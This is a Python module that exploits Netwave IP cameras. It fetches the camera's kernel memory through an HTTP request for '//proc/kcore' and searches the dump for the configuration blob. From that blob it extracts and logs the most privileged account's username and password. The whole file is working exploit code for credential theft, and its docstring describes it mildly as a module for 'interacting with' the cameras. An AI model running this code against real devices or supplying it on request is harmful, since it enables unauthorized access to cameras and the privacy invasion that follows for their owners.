"""A module for interacting with Netwave IP cameras."""

from __future__ import annotations

import asyncio
import logging
import re
from dataclasses import dataclass
from re import Pattern
from struct import Struct
from typing import Any, Final, Optional

import aiohttp

CONFIG_MAGIC: Final[bytes] = b"\xbd\x9a\x0c\x44"
DEVICE_ID_OFFSET: Final[int] = 0x0C
DEVICE_ID: Final[Pattern[bytes]] = re.compile(rb"[0-9A-F]{12}\x00")
USERS_OFFSET: Final[int] = 0x36
USER: Final[Struct] = Struct("=13s13sB")
CONFIG_SIZE: Final[int] = USERS_OFFSET + 8 * USER.size

logger = logging.getLogger(__name__)


@dataclass
class DeviceCredentials:
    """A class for representing the credentials of a Netwave IP camera."""

    host: str
    port: int
    username: Optional[str] = None
    password: Optional[str] = None

    def __str__(self) -> str:
        if self.username is None and self.password is None:
            return f"{self.host}:{self.port}"

        if self.password is None:
            return f"{self.username}@{self.host}:{self.port}"

        return f"{self.username}:{self.password}@{self.host}:{self.port}"

    def __bool__(self) -> bool:
        return self.username is not None


class NetwaveDevice:
    """
    A class for interacting with a Netwave IP camera.

    Parameters
    ----------
    host : str
        The host of the Netwave IP camera.
    port : int
        The port of the Netwave IP camera.
    """

    def __init__(self, host: str, port: int) -> None:
        self._host = host
        self._port = port
        self._session = aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(30))

    def __str__(self) -> str:
        return f"{self._host}:{self._port}"

    def __repr__(self) -> str:
        return f"{self.__class__.__name__}(host={self._host!r}, port={self._port!r})"

    async def __aenter__(self) -> NetwaveDevice:
        return self

    async def __aexit__(self, *_: Any) -> None:
        await self.close()

    @staticmethod
    def _field(data: bytes) -> Optional[str]:
        """
        Decode a NUL-terminated fixed-size ASCII field.

        Parameters
        ----------
        data : bytes
            The raw field.

        Returns
        -------
        Optional[str]
            The field value, or None if it is empty or not printable ASCII.
        """
        value = data.split(b"\x00", 1)[0]

        if not value or not value.isascii() or not value.decode().isprintable():
            return None

        return value.decode()

    def _parse_config(self, config: bytes) -> Optional[DeviceCredentials]:
        """
        Read the most privileged account out of a configuration blob.

        Parameters
        ----------
        config : bytes
            The configuration blob, starting at its magic.

        Returns
        -------
        Optional[DeviceCredentials]
            The account with the highest privilege, or None if the table is empty.
        """
        credentials: Optional[DeviceCredentials] = None
        highest = -1

        for raw_username, raw_password, privilege in USER.iter_unpack(
            config[USERS_OFFSET:CONFIG_SIZE]
        ):
            if privilege <= highest:
                continue

            username = self._field(raw_username)

            if username is None:
                continue

            highest = privilege
            password = self._field(raw_password)
            credentials = DeviceCredentials(self._host, self._port, username, password)

        return credentials

    def _scan(self, window: bytes) -> Optional[DeviceCredentials]:
        """
        Find the device's configuration blob in a slice of its memory.

        Parameters
        ----------
        window : bytes
            The memory to search.

        Returns
        -------
        Optional[DeviceCredentials]
            The most privileged account of the first valid blob, or None.
        """
        for match in re.finditer(re.escape(CONFIG_MAGIC), window):
            config = window[match.start() : match.start() + CONFIG_SIZE]

            if len(config) != CONFIG_SIZE:
                continue

            device_id = DEVICE_ID.match(config, DEVICE_ID_OFFSET)

            if device_id is None:
                continue

            credentials = self._parse_config(config)

            if credentials is None:
                continue

            logger.info("[%s] Device ID: %s", self, device_id.group()[:-1].decode())
            return credentials

        return None

    async def _dump_memory(self) -> Optional[DeviceCredentials]:
        """
        Dump the memory of the Netwave IP camera and retrieve its credentials.

        Returns
        -------
        Optional[DeviceCredentials]
            The credentials of the Netwave IP camera, or None if the
            configuration blob was not found in the dump.
        """
        async with self._session.get(
            f"http://{self}//proc/kcore", timeout=aiohttp.ClientTimeout(0)
        ) as response:
            if (
                response.status != 200
                or response.headers.get("Server") != "Netwave IP Camera"
            ):
                logger.error("[%s] Device is not vulnerable", self)
                return None

            logger.info("[%s] Dumping memory...", self)
            window = b""

            async for chunk in response.content.iter_any():
                window = window[-CONFIG_SIZE:] + chunk
                credentials = self._scan(window)

                if credentials is None:
                    continue

                return credentials

            logger.error("[%s] Could not find the config blob in memory dump", self)
            return None

    @property
    def host(self) -> str:
        """The host of the Netwave IP camera."""
        return self._host

    @property
    def port(self) -> int:
        """The port of the Netwave IP camera."""
        return self._port

    async def close(self) -> None:
        """Close the session."""
        await self._session.close()

    async def get_credentials(
        self, *, timeout: int = 300
    ) -> Optional[DeviceCredentials]:
        """
        Get the credentials of the Netwave IP camera.

        Parameters
        ----------
        timeout : int, optional
            The timeout in seconds for retrieving the credentials from the memory dump,
            by default 300.

        Returns
        -------
        DeviceCredentials
            The credentials of the Netwave IP camera.
            Returns None if the credentials could not be found.
        """
        try:
            credentials = await asyncio.wait_for(self._dump_memory(), timeout=timeout)
        except (ConnectionError, asyncio.TimeoutError, aiohttp.ClientError):
            logger.error("[%s] Could not dump memory", self)
            return None

        if credentials is None:
            return None

        if credentials.password is None:
            logger.info("[%s] Found credentials: %s", self, credentials.username)
        else:
            logger.info(
                "[%s] Found credentials: %s:%s",
                self,
                credentials.username,
                credentials.password,
            )

        return credentials
